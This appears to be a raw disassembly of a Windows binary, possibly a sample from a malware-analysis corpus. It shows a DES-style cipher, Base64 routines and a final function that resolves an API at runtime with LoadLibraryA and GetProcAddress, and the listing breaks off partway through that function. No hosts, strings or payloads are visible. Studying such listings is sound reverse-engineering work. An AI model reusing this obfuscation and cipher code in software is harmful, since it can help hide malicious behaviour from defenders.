sub_401000
push ebp
mov ebp esp
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
lea ecx [ eax + 0x1 ]
mov eax [ ebp + 0x8 ]
push esi
add eax 0x2
mov esi 0x2
lea esp [ esp ]
movzx edx [ eax + 0x5 ]
add dl dl
or dl [ eax + 0x4 ]
add ecx 0x4
add dl dl
or dl [ eax + 0x3 ]
add eax 0x20
add dl dl
or dl [ eax - 0x1e ]
add dl dl
or dl [ eax - 0x1f ]
add dl dl
or dl [ eax - 0x20 ]
add dl dl
or dl [ eax - 0x21 ]
add dl dl
or dl [ eax - 0x22 ]
or [ ecx - 0x5 ] dl
movzx edx [ eax - 0x13 ]
add dl dl
or dl [ eax - 0x14 ]
add dl dl
or dl [ eax - 0x15 ]
add dl dl
or dl [ eax - 0x16 ]
add dl dl
or dl [ eax - 0x17 ]
add dl dl
or dl [ eax - 0x18 ]
add dl dl
or dl [ eax - 0x19 ]
add dl dl
or dl [ eax - 0x1a ]
or [ ecx - 0x4 ] dl
movzx edx [ eax - 0xb ]
add dl dl
or dl [ eax - 0xc ]
add dl dl
or dl [ eax - 0xd ]
add dl dl
or dl [ eax - 0xe ]
add dl dl
or dl [ eax - 0xf ]
add dl dl
or dl [ eax - 0x10 ]
add dl dl
or dl [ eax - 0x11 ]
add dl dl
or dl [ eax - 0x12 ]
or [ ecx - 0x3 ] dl
movzx edx [ eax - 0x3 ]
add dl dl
or dl [ eax - 0x4 ]
add dl dl
or dl [ eax - 0x5 ]
add dl dl
or dl [ eax - 0x6 ]
add dl dl
or dl [ eax - 0x7 ]
add dl dl
or dl [ eax - 0x8 ]
add dl dl
or dl [ eax - 0x9 ]
add dl dl
or dl [ eax - 0xa ]
or [ ecx - 0x2 ] dl
dec esi
jne r-xdata
xor eax eax
pop esi
pop ebp
retn
sub_4010e0
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
lea eax [ ebp - 0x3c ]
mov esi edx
mov [ ebp - 0x7c ] ecx
call sub_4011c0
mov [ ebp - 0x78 ] rw-data
lea ebx [ ebx ]
mov eax [ ebp - 0x78 ]
mov esi [ eax ]
push esi
lea ecx [ ebp - 0x3c ]
push ecx
lea edx [ ebp - 0x74 ]
push edx
call sub_40af70
push esi
lea ecx [ ebp - 0x20 ]
lea eax [ ebp + esi - 0x74 ]
push ecx
push eax
mov [ ebp - 0x80 ] eax
call sub_40af70
mov edi 0x1c
sub edi esi
push edi
lea edx [ ebp + esi - 0x3c ]
push edx
lea eax [ ebp - 0x3c ]
push eax
call sub_40af70
mov ebx esi
push esi
lea ecx [ ebp - 0x74 ]
neg ebx
push ecx
lea edx [ ebp + ebx - 0x20 ]
push edx
call sub_40af70
push edi
lea eax [ ebp + esi - 0x20 ]
push eax
lea ecx [ ebp - 0x20 ]
push ecx
call sub_40af70
mov edx [ ebp - 0x80 ]
push esi
push edx
lea eax [ ebp + ebx - 0x4 ]
push eax
call sub_40af70
mov edi [ ebp - 0x7c ]
add esp 0x48
mov eax edi
lea esi [ ebp - 0x3c ]
call sub_401210
mov eax [ ebp - 0x78 ]
add eax 0x4
add edi 0x30
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x7c ] edi
cmp eax rw-data
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_4042ed
mov esp ebp
pop ebp
retn
sub_4011c0
push edi
inc eax
mov ecx rw-data
mov edi 0xe
lea esp [ esp ]
mov edx [ ecx - 0x4 ]
movzx edx [ esi + edx ]
mov [ eax - 0x1 ] dl
mov edx [ ecx ]
movzx edx [ esi + edx ]
mov [ eax ] dl
mov edx [ ecx + 0x4 ]
movzx edx [ esi + edx ]
mov [ eax + 0x1 ] dl
mov edx [ ecx + 0x8 ]
movzx edx [ esi + edx ]
mov [ eax + 0x2 ] dl
add eax 0x4
add ecx 0x10
dec edi
jne r-xdata
xor eax eax
pop edi
retn
sub_401210
push edi
inc eax
mov ecx rw-data
mov edi 0x8
lea esp [ esp ]
mov edx [ ecx - 0x4 ]
movzx edx [ esi + edx ]
mov [ eax - 0x1 ] dl
mov edx [ ecx ]
movzx edx [ esi + edx ]
mov [ eax ] dl
mov edx [ ecx + 0x4 ]
movzx edx [ esi + edx ]
mov [ eax + 0x1 ] dl
mov edx [ ecx + 0x8 ]
movzx edx [ esi + edx ]
mov [ eax + 0x2 ] dl
mov edx [ ecx + 0xc ]
movzx edx [ esi + edx ]
mov [ eax + 0x3 ] dl
mov edx [ ecx + 0x10 ]
movzx edx [ esi + edx ]
mov [ eax + 0x4 ] dl
add eax 0x6
add ecx 0x18
dec edi
jne r-xdata
xor eax eax
pop edi
retn
sub_401270
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi ecx
xor eax eax
jmp r-xdata
mov ecx [ eax * 4 + rw-data ]
movzx edx [ edi + ecx ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp + eax - 0x44 ] dl
movzx edx [ edi + ecx ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp + eax - 0x43 ] dl
movzx edx [ edi + ecx ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp + eax - 0x42 ] dl
movzx edx [ edi + ecx ]
mov [ ebp + eax - 0x41 ] dl
add eax 0x4
cmp eax 0x40
jl r-xdata
mov ecx 0x10
lea esi [ ebp - 0x44 ]
[ edi ] [ esi ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_4042ed
mov esp ebp
pop ebp
retn
sub_4012f0
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi ecx
xor eax eax
jmp r-xdata
mov ecx [ eax * 4 + rw-data ]
movzx edx [ edi + ecx ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp + eax - 0x44 ] dl
movzx edx [ edi + ecx ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp + eax - 0x43 ] dl
movzx edx [ edi + ecx ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp + eax - 0x42 ] dl
movzx edx [ edi + ecx ]
mov [ ebp + eax - 0x41 ] dl
add eax 0x4
cmp eax 0x40
jl r-xdata
mov ecx 0x10
lea esi [ ebp - 0x44 ]
[ edi ] [ esi ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_4042ed
mov esp ebp
pop ebp
retn
sub_401370
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi ecx
xor eax eax
jmp r-xdata
mov ecx [ eax * 4 + rw-data ]
movzx edx [ edi + ecx ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp + eax - 0x34 ] dl
movzx edx [ edi + ecx ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp + eax - 0x33 ] dl
movzx edx [ edi + ecx ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp + eax - 0x32 ] dl
movzx edx [ edi + ecx ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp + eax - 0x31 ] dl
movzx edx [ edi + ecx ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp + eax - 0x30 ] dl
movzx edx [ edi + ecx ]
mov [ ebp + eax - 0x2f ] dl
add eax 0x6
cmp eax 0x30
jl r-xdata
mov ecx 0xc
lea esi [ ebp - 0x34 ]
[ edi ] [ esi ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_4042ed
mov esp ebp
pop ebp
retn
sub_401410
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi ecx
xor eax eax
jmp r-xdata
mov ecx [ eax * 4 + rw-data ]
movzx edx [ edi + ecx ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp + eax - 0x24 ] dl
movzx edx [ edi + ecx ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp + eax - 0x23 ] dl
movzx edx [ edi + ecx ]
mov ecx [ eax * 4 + rw-data ]
mov [ ebp + eax - 0x22 ] dl
movzx edx [ edi + ecx ]
mov [ ebp + eax - 0x21 ] dl
add eax 0x4
cmp eax 0x20
jl r-xdata
mov ecx 0x8
lea esi [ ebp - 0x24 ]
[ edi ] [ esi ]
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_4042ed
mov esp ebp
pop ebp
retn
sub_401490
push ebp
mov ebp esp
sub esp 0x50
push ebx
mov ebx [ ebp + 0x8 ]
lea edx [ ebx + 0x3 ]
lea eax [ ebx + 0x4 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebx + 0x14 ]
lea ecx [ edx + 0xc ]
push esi
push edi
lea edi [ ebx + 0x5 ]
mov [ ebp - 0x18 ] ecx
lea ecx [ ebx + 0xa ]
mov [ ebp - 0x14 ] eax
lea eax [ ebx + 0x5 ]
mov [ ebp - 0xc ] ecx
lea ecx [ ebx + 0xd ]
sub ebx edi
mov [ ebp - 0x34 ] ebx
mov ebx [ ebp + 0x8 ]
inc ebx
sub ebx edi
mov [ ebp - 0x38 ] ebx
mov ebx [ ebp + 0x8 ]
add ebx 0x2
sub ebx edi
mov [ ebp - 0x3c ] ebx
mov ebx edx
sub ebx edi
mov [ ebp - 0x40 ] ebx
mov ebx [ ebp - 0x10 ]
sub ebx edi
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x8 ] eax
lea eax [ edi + 0x6 ]
mov edi [ ebp + 0x8 ]
mov ebx edi
inc edi
sub ebx edi
mov [ ebp - 0x1c ] ebx
mov ebx [ ebp + 0x8 ]
add ebx 0x2
sub ebx edi
mov [ ebp - 0x20 ] ebx
mov ebx edx
sub ebx edi
mov [ ebp - 0x48 ] ebx
mov ebx [ ebp - 0x10 ]
sub ebx edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x4c ] ebx
mov ebx edi
add edi 0x2
sub ebx edi
mov [ ebp - 0x24 ] ebx
mov ebx edx
sub ebx edi
mov [ ebp - 0x28 ] ebx
mov ebx [ ebp - 0x10 ]
sub ebx edi
mov [ ebp - 0x50 ] ebx
mov ebx [ ebp + 0x8 ]
mov edi edx
sub ebx edi
mov [ ebp - 0x2c ] ebx
mov ebx [ ebp - 0x10 ]
xor esi esi
sub ebx edi
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x2c ]
movsx ebx [ edx + ebx ]
lea edi [ esi + esi ]
add ebx edi
movsx edi [ eax - 0x6 ]
lea edi [ edi + ebx * 2 ]
movsx ebx [ ecx - 0xc ]
lea edi [ ebx + edi * 2 ]
mov ebx [ ebp - 0x14 ]
movsx ebx [ ebx - 0x12 ]
lea edi [ ebx + edi * 2 ]
movsx ebx [ edx ]
lea edi [ ebx + edi * 2 ]
mov ebx [ ebp - 0x10 ]
movsx edx [ edx + ebx ]
lea edx [ edx + edi * 2 ]
mov edx [ edx * 4 + rw-data ]
mov edi [ ebp + 0x8 ]
mov ebx edx
sar ebx 0x3
and bl 0x1
mov [ edi + esi * 4 ] bl
mov ebx edx
sar ebx 0x2
and bl 0x1
mov [ edi + esi * 4 + 0x1 ] bl
mov ebx edx
and dl 0x1
mov [ edi + esi * 4 + 0x3 ] dl
mov edx [ ebp - 0x34 ]
sar ebx 0x1
and bl 0x1
mov [ edi + esi * 4 + 0x2 ] bl
movsx edi [ edx + eax ]
movsx edx [ eax ]
lea edi [ edi + esi * 2 ]
lea edx [ edx + edi * 2 ]
mov edi [ ebp - 0x38 ]
movsx edi [ edi + eax ]
lea edx [ edi + edx * 2 ]
mov edi [ ebp - 0x3c ]
movsx edi [ edi + eax ]
lea edx [ edi + edx * 2 ]
mov edi [ ebp - 0x40 ]
movsx edi [ edi + eax ]
lea edx [ edi + edx * 2 ]
mov edi [ ebp - 0x44 ]
movsx edi [ edi + eax ]
mov ebx [ ebp - 0x1c ]
lea edx [ edi + edx * 2 ]
mov edi [ edx * 4 + rw-data ]
mov edx edi
sar edx 0x3
and dl 0x1
mov [ ebp - 0x4 ] edi
mov edi [ ebp - 0x8 ]
mov [ ebx + edi ] dl
mov edx [ ebp - 0x4 ]
mov ebx edx
sar edx 0x1
sar ebx 0x2
and dl 0x1
and bl 0x1
mov [ edi ] bl
mov ebx [ ebp - 0x20 ]
mov [ ebx + edi ] dl
mov dl [ ebp - 0x4 ]
mov ebx [ ebp - 0x48 ]
and dl 0x1
mov [ ebx + edi ] dl
mov edx [ ebp - 0x1c ]
movsx edi [ edx + ecx ]
movsx edx [ eax + 0x6 ]
lea edi [ edi + esi * 2 ]
lea edx [ edx + edi * 2 ]
movsx edi [ ecx ]
lea edx [ edi + edx * 2 ]
mov edi [ ebp - 0x20 ]
movsx edi [ edi + ecx ]
lea edx [ edi + edx * 2 ]
movsx edi [ ebx + ecx ]
lea edx [ edi + edx * 2 ]
mov edi [ ebp - 0x4c ]
movsx edi [ edi + ecx ]
lea edx [ edi + edx * 2 ]
mov edi [ edx * 4 + rw-data ]
mov ebx [ ebp - 0xc ]
mov edx edi
mov [ ebp - 0x4 ] edi
mov edi [ ebp - 0x24 ]
sar edx 0x3
and dl 0x1
mov [ edi + ebx ] dl
mov edx [ ebp - 0x4 ]
mov edi [ ebp - 0x8 ]
mov ebx edx
sar ebx 0x2
and bl 0x1
mov [ edi + 0x4 ] bl
mov edi [ ebp - 0xc ]
mov ebx edx
sar ebx 0x1
and bl 0x1
mov [ edi ] bl
mov ebx [ ebp - 0x28 ]
and dl 0x1
mov [ edi + ebx ] dl
mov edx [ ebp - 0x14 ]
mov edi [ ebp - 0x24 ]
movsx ebx [ edi + edx ]
movsx edi [ eax + 0xc ]
lea ebx [ ebx + esi * 2 ]
lea edi [ edi + ebx * 2 ]
movsx ebx [ ecx + 0x6 ]
lea edi [ ebx + edi * 2 ]
movsx ebx [ edx ]
lea edi [ ebx + edi * 2 ]
mov ebx [ ebp - 0x28 ]
movsx ebx [ edx + ebx ]
lea edi [ ebx + edi * 2 ]
mov ebx [ ebp - 0x50 ]
movsx edx [ edx + ebx ]
mov ebx [ ebp - 0x18 ]
lea edx [ edx + edi * 2 ]
mov edi [ edx * 4 + rw-data ]
mov edx edi
add [ ebp - 0x14 ] 0x18
sar edx 0x3
mov [ ebp - 0x4 ] edi
mov edi [ ebp - 0x2c ]
and dl 0x1
mov [ ebx + edi ] dl
mov edx [ ebp - 0x4 ]
mov edi [ ebp - 0x8 ]
add [ ebp - 0x8 ] 0x10
mov ebx edx
sar ebx 0x2
and bl 0x1
mov [ edi + 0x8 ] bl
mov edi [ ebp - 0xc ]
add [ ebp - 0xc ] 0x10
mov ebx edx
sar ebx 0x1
and bl 0x1
mov [ edi + 0x4 ] bl
mov edi [ ebp - 0x18 ]
and dl 0x1
mov [ edi ] dl
mov edx [ ebp - 0x30 ]
add esi 0x4
add edx 0x18
add edi 0x10
add eax 0x18
add ecx 0x18
mov [ ebp - 0x30 ] edx
mov [ ebp - 0x18 ] edi
cmp esi 0x8
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_401750
push ebp
mov ebp esp
sub esp 0x9c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov [ ebp - 0x7c ] eax
xor edi edi
lea esi [ ebp - 0x74 ]
mov cl al
mov bl dl
sar bl cl
inc eax
and bl 0x1
mov [ esi + eax - 0x1 ] bl
cmp eax 0x8
jl r-xdata
inc edi
add esi 0x8
cmp edi 0x8
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov dl [ edi + ecx ]
xor eax eax
lea esp [ esp ]
lea ecx [ ebp - 0x74 ]
call sub_401270
mov ebx [ ebp + 0xc ]
mov [ ebp - 0x78 ] 0x0
inc ebx
nop
movzx edx [ ebx + eax - 0x1 ]
movzx ecx [ ebx + eax ]
xor [ ebp + eax - 0x34 ] dl
xor [ ebp + eax - 0x33 ] cl
movzx edx [ ebx + eax + 0x1 ]
movzx ecx [ ebx + eax + 0x2 ]
xor [ ebp + eax - 0x32 ] dl
xor [ ebp + eax - 0x31 ] cl
movzx edx [ ebx + eax + 0x3 ]
movzx ecx [ ebx + eax + 0x4 ]
xor [ ebp + eax - 0x30 ] dl
xor [ ebp + eax - 0x2f ] cl
add eax 0x6
cmp eax 0x30
jl r-xdata
lea edx [ ebp - 0x34 ]
push edx
call sub_401490
add esp 0x4
lea ecx [ ebp - 0x34 ]
call sub_401410
xor eax eax
jmp r-xdata
movzx ecx [ ebp + eax - 0x34 ]
movzx edx [ ebp + eax - 0x33 ]
xor [ ebp + eax - 0x74 ] cl
xor [ ebp + eax - 0x73 ] dl
movzx ecx [ ebp + eax - 0x32 ]
movzx edx [ ebp + eax - 0x31 ]
xor [ ebp + eax - 0x72 ] cl
xor [ ebp + eax - 0x71 ] dl
add eax 0x4
cmp eax 0x20
jl r-xdata
mov eax [ ebp - 0x78 ]
cmp eax 0xf
je r-xdata
inc eax
add ebx 0x30
mov [ ebp - 0x78 ] eax
cmp eax 0x10
jl r-xdata
mov ecx 0x8
lea esi [ ebp - 0x74 ]
lea edi [ ebp - 0x9c ]
[ edi ] [ esi ]
mov ecx 0x8
lea esi [ ebp - 0x54 ]
lea edi [ ebp - 0x74 ]
[ edi ] [ esi ]
mov ecx 0x8
lea esi [ ebp - 0x9c ]
lea edi [ ebp - 0x54 ]
[ edi ] [ esi ]
mov ecx 0x8
lea esi [ ebp - 0x54 ]
lea edi [ ebp - 0x34 ]
[ edi ] [ esi ]
lea ecx [ ebp - 0x34 ]
call sub_401370
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x74 ]
call sub_4012f0
lea eax [ ebp - 0x74 ]
push eax
mov eax [ ebp - 0x7c ]
call sub_401000
mov ecx [ ebp - 0x4 ]
add esp 0x4
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_4042ed
mov esp ebp
pop ebp
retn
sub_4018d0
push ebp
mov ebp esp
sub esp 0x368
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor edi edi
mov edx eax
and edx 0x80000007
mov [ ebp - 0x364 ] edi
mov [ ebp - 0x360 ] edi
jns r-xdata
je r-xdata
dec edx
or edx 0xfffffff8
inc edx
cmp eax 0xa8c
jle r-xdata
cdq
and edx 0x7
add eax edx
sar eax 0x3
lea eax [ eax * 8 + 0x8 ]
mov edx [ ecx ]
mov eax [ ecx + 0x4 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] eax
lea esi [ ebp - 0x5c ]
or eax 0xffffffff
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_4042ed
mov esp ebp
pop ebp
retn
mov cl al
mov bl dl
sar bl cl
inc eax
and bl 0x1
mov [ esi + eax - 0x1 ] bl
cmp eax 0x8
jl r-xdata
inc edi
add esi 0x8
cmp edi 0x8
jl r-xdata
mov dl [ ebp + edi - 0x10 ]
xor eax eax
lea ecx [ ebp - 0x35c ]
lea edx [ ebp - 0x5c ]
call sub_4010e0
mov ebx [ ebp + 0x8 ]
cmp ebx 0x8
jl r-xdata
mov ecx [ ebp - 0x364 ]
sub ebx ecx
mov esi ebx
xor eax eax
test esi esi
jle r-xdata
mov esi [ rw-data ]
mov edi [ rw-data ]
sub edi esi
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ ebp - 0x360 ]
mov edx [ rw-data ]
push esi
add edx ecx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
push edx
lea eax [ ebp - 0x18 ]
push eax
call sub_40af70
lea ecx [ ebp - 0x10 ]
push ecx
lea edx [ ebp - 0x35c ]
push edx
lea eax [ ebp - 0x18 ]
push eax
call sub_401750
mov edx [ ebp - 0x360 ]
mov eax [ ebp - 0x10 ]
mov ecx [ rw-data ]
mov [ ecx + edx ] eax
mov eax [ ebp - 0xc ]
mov [ ecx + edx + 0x4 ] eax
mov eax 0x8
add esp 0x18
add edx 0x8
sub eax esi
jmp r-xdata
mov ecx [ edi + esi ]
mov edx [ edi + esi + 0x4 ]
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] ecx
push eax
lea ecx [ ebp - 0x35c ]
mov [ ebp - 0x14 ] edx
push ecx
lea edx [ ebp - 0x18 ]
push edx
call sub_401750
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ esi ] eax
mov eax 0x8
add [ ebp - 0x360 ] eax
add [ ebp - 0x364 ] eax
mov [ esi + 0x4 ] ecx
sub ebx eax
add esp 0xc
add esi eax
cmp ebx eax
jge r-xdata
mov [ ecx + edx ] al
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
lea eax [ edx + 0x1 ]
pop ebx
call sub_4042ed
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x8 ]
sub_401a70
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x8 ]
mov eax 0x55555556
imul ecx
mov eax edx
shr eax 0x1f
add eax edx
lea edx [ eax + eax * 2 ]
mov eax ecx
sub eax edx
jne r-xdata
cmp eax 0x1
jne r-xdata
mov eax ecx
jmp r-xdata
cmp eax 0x2
lea eax [ ecx + 0x1 ]
je r-xdata
lea eax [ ecx + 0x2 ]
jmp r-xdata
lea edx [ eax * 4 ]
mov eax 0x55555556
imul edx
mov eax edx
shr eax 0x1f
add eax edx
cmp eax 0xe0f
jle r-xdata
mov eax [ ebp - 0x8 ]
push ebx
push esi
mov [ ebp - 0x8 ] ecx
inc ecx
push edi
push ecx
xor ebx ebx
xor esi esi
call sub_4044b8
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
push ecx
mov edi eax
push edx
push edi
call sub_40af70
mov ecx [ ebp + 0x8 ]
add esp 0x10
mov [ edi + ecx ] bl
cmp ecx 0x3
jl r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp eax 0x2
jne r-xdata
mov eax 0xaaaaaaab
mul ecx
shr edx 0x1
lea eax [ edx + edx * 2 ]
sub ecx eax
mov [ ebp + 0x8 ] edx
mov [ ebp - 0x8 ] ecx
cmp eax 0x1
jne r-xdata
movzx eax [ edi + ebx ]
shr eax 0x2
mov cl [ eax + rw-data ]
mov eax [ ebp - 0x4 ]
mov [ esi + eax ] cl
movsx edx [ edi + ebx ]
lea ecx [ edi + ebx + 0x1 ]
movzx ebx [ ecx ]
and edx 0x3
shl edx 0x4
shr ebx 0x4
or edx ebx
movzx edx [ edx + rw-data ]
mov [ esi + eax + 0x1 ] dl
movsx ecx [ ecx ]
and ecx 0xf
movzx edx [ ecx * 4 + rw-data ]
mov [ esi + eax + 0x2 ] dl
mov [ esi + eax + 0x3 ] 0x3d
add esi 0x4
jmp r-xdata
movzx ecx [ edi + ebx ]
mov eax [ ebp - 0x4 ]
shr ecx 0x2
movzx edx [ ecx + rw-data ]
mov [ eax + esi ] dl
movsx ecx [ edi + ebx ]
movzx edx [ edi + ebx + 0x1 ]
and ecx 0x3
shr edx 0x4
shl ecx 0x4
or ecx edx
mov cl [ ecx + rw-data ]
mov [ eax + esi + 0x1 ] cl
movsx edx [ edi + ebx + 0x1 ]
movzx ecx [ edi + ebx + 0x2 ]
and edx 0xf
add edx edx
add edx edx
shr ecx 0x6
or edx ecx
movzx edx [ edx + rw-data ]
mov [ eax + esi + 0x2 ] dl
movsx ecx [ edi + ebx + 0x2 ]
and ecx 0x3f
movzx edx [ ecx + rw-data ]
mov [ eax + esi + 0x3 ] dl
add ebx 0x3
add esi 0x4
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ edi + ebx ]
shr eax 0x2
movzx ecx [ eax + rw-data ]
mov eax [ ebp - 0x4 ]
mov [ esi + eax ] cl
movsx edx [ edi + ebx ]
and edx 0x3
shl edx 0x4
movzx ecx [ edx + rw-data ]
mov [ esi + eax + 0x1 ] cl
mov [ esi + eax + 0x2 ] 0x3d3d
add esi 0x4
jmp r-xdata
push edi
mov [ esi + eax ] 0x0
call sub_40445e
add esp 0x4
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_401c40
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
sub esp 0x8
push esi
mov esi edx
push edi
mov edi eax
lea ecx [ esi + 0x1 ]
mov al [ esi ]
inc esi
test al al
jne r-xdata
sub esi ecx
mov eax esi
and eax 0x80000003
jns r-xdata
je r-xdata
dec eax
or eax 0xfffffffc
inc eax
push ebx
push r--data
push edx
xor ebx ebx
call sub_404300
add esp 0x8
test eax eax
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push 0x3d
push ecx
call sub_4043a0
add esp 0x8
test eax eax
je r-xdata
mov ebx 0x2
jmp r-xdata
lea eax [ esi + esi * 2 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
sub eax ebx
cmp edi eax
jge r-xdata
mov ebx 0x1
sub esi ebx
mov [ ebp - 0x4 ] esi
push edi
xor ebx ebx
xor esi esi
call sub_4044b8
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x4
cmp eax 0x4
jl r-xdata
pop ebx
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn
cmp eax 0x3
jne r-xdata
mov ecx eax
shr ecx 0x2
mov [ ebp - 0x8 ] ecx
neg ecx
lea edx [ eax + ecx * 4 ]
mov [ ebp - 0x4 ] edx
cmp eax 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
movsx eax [ ebx + eax ]
push eax
push rw-data
call sub_4043a0
mov edx [ ebp + 0x8 ]
mov ecx rw-data
sub al cl
add al al
add al al
mov [ edi + esi ] al
movsx eax [ ebx + edx + 0x1 ]
push eax
push ecx
call sub_4043a0
mov edx [ ebp + 0x8 ]
sub eax rw-data
mov ecx eax
shl al 0x4
sar ecx 0x4
or [ edi + esi ] cl
mov [ edi + esi + 0x1 ] al
movsx eax [ ebx + edx + 0x2 ]
push eax
push rw-data
call sub_4043a0
sub eax rw-data
sar eax 0x2
or [ edi + esi + 0x1 ] al
add esp 0x18
add esi 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
movsx eax [ eax + ebx ]
push eax
push rw-data
call sub_4043a0
mov edx [ ebp + 0x8 ]
mov ecx rw-data
sub al cl
add al al
add al al
mov [ edi + esi ] al
movsx eax [ edx + ebx + 0x1 ]
push eax
push ecx
call sub_4043a0
mov edx [ ebp + 0x8 ]
sub eax rw-data
mov ecx eax
shl al 0x4
sar ecx 0x4
or [ edi + esi ] cl
mov [ edi + esi + 0x1 ] al
movsx eax [ edx + ebx + 0x2 ]
push eax
push rw-data
call sub_4043a0
mov edx [ ebp + 0x8 ]
sub eax rw-data
mov ecx eax
shl al 0x6
sar ecx 0x2
or [ edi + esi + 0x1 ] cl
mov [ edi + esi + 0x2 ] al
movsx eax [ edx + ebx + 0x3 ]
push eax
push rw-data
call sub_4043a0
sub eax rw-data
or [ edi + esi + 0x2 ] al
add esp 0x20
add ebx 0x4
add esi 0x3
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
push esi
push edi
push eax
call sub_40af70
push edi
call sub_40445e
add esp 0x10
pop ebx
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
movsx eax [ ebx + eax ]
push eax
push rw-data
call sub_4043a0
mov edx [ ebp + 0x8 ]
mov ecx rw-data
sub al cl
add al al
add al al
mov [ edi + esi ] al
movsx eax [ ebx + edx + 0x1 ]
push eax
push ecx
call sub_4043a0
sub eax rw-data
sar eax 0x4
or [ edi + esi ] al
add esp 0x10
inc esi
sub_401e60
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
push edi
lea esi [ ebx + 0x1 ]
push esi
call sub_404572
push esi
mov edi eax
push 0x0
push edi
call sub_40aef0
mov esi [ ebp + 0x8 ]
mov eax esi
add esp 0x10
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
cmp ebx eax
jl r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
push edi
mov eax esi
call sub_404220
add esp 0x4
test eax eax
jne r-xdata
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push ebx
push edi
call sub_401c40
mov esi eax
push edi
mov [ esi + ebx ] 0x0
call sub_404538
add esp 0xc
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_401ed0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x854
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x850 ] eax
push ebx
push esi
push edi
push r--data
call [ LoadLibraryA@IAT ]
push r--data
push eax
call [ GetProcAddress@IAT ]
mov ecx 0x10
mov esi r--data
mov edi rw-data
mov [ rw-data ] eax
[ edi ] [ esi ]
call sub_402e90
push r--data
push rw-data
call sub_404300
add eax 0x7
mov edx rw-data
add esp 0x8
sub edx eax
xor ebx ebx
lea ecx [ ecx ]
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
